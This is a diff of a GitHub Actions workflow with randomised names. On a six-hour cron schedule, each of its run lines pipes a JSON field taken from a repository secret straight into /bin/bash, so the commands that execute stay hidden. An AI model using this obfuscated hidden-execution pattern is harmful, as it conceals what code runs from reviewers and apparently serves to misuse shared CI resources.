@@ -1,31 +1,18 @@
 name: diaoyubu3478
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 1/6 * * *'
-
+    - cron: '25 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: diaoyubu3478
         env:
-          epbk392: ${{ secrets.epbk392 }}
+          orxv50: ${{ secrets.orxv50 }}
         run: |
-          echo $epbk392 | jq -r .f5256 | /bin/bash
-          echo $ehxs6336 | jq -r .kxis2 | /bin/bash
-          echo $g3373 | jq -r .sp08368 | /bin/bash
-          echo $lnw582 | jq -r .fggik26343 | /bin/bash
-          echo $ru82 | jq -r .ogoan7888 | /bin/bash
-          echo $xh99113 | jq -r .k44867 | /bin/bash
-          echo $cgs7646 | jq -r .r4 | /bin/bash
-          echo $e76 | jq -r .qbx3 | /bin/bash
-          echo $gu1 | jq -r .t9791 | /bin/bash
-          echo $rzbl3474 | jq -r .p55 | /bin/bash
-          echo $xbo2 | jq -r .nhrg2 | /bin/bash
-          echo $tnpv630 | jq -r .v4 | /bin/bash
-          echo $xxt361 | jq -r .eg775 | /bin/bash
-          echo $k92835 | jq -r .gtwe114 | /bin/bash
+          echo $orxv50 | jq -r .aopd58427 | /bin/bash
+          echo $km0 | jq -r .zp9442 | /bin/bash
 
